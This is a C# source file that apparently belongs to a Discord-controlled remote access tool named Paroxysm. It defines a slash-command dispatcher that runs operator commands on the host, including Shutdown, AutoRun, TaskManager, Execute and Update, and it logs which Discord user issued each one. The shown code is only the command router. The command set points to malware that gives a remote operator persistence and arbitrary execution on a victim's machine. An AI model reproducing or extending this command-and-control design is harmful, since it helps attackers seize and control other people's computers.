using Discord.WebSocket;
using Paroxysm.Discord.Commands;
using Paroxysm.Discord.Commands.Models;

namespace Paroxysm.API;

public static class DiscordCommand
{
    public static IEnumerable<ISlashCommand> GetCommands()
    {
        return new ISlashCommand[]
        {
            new ConsoleCmd(),
            new WallpaperCmd(),
            new PingCmd(),
            new ShutdownCmd(),
            new AutoRunCmd(),
            new CursorCmd(),
            new TaskManagerCmd(),
            new WebpageCmd(),
            new ExecuteCmd(),
            new UpdateCmd()
        };
    }


    public static Task OnMessageReceivedAsync(SocketMessage message)
    {
        return Task.CompletedTask;
    }

    public static Task OnSlashCommandExecute(SocketSlashCommand slashCommand)
    {
        var commands = GetCommands();
        foreach (var command in commands)
        {
            if (command.Options().Name != slashCommand.CommandName) continue;

            var result = command.Execute(slashCommand.Data);
            var commandOptions =
                slashCommand.Data.Options.Count > 0 ? slashCommand.Data.Options.ElementAt(0).Value as string : "";
            Console.ForegroundColor = ConsoleColor.DarkCyan;
            Console.WriteLine(
                $"[Executor] -> \tUser {slashCommand.User.Username} has executed command /{slashCommand.CommandName} {commandOptions}");
            Console.ResetColor();

            slashCommand.RespondAsync(null, new[] { result }, false, true);
        }

        return Task.CompletedTask;
    }
}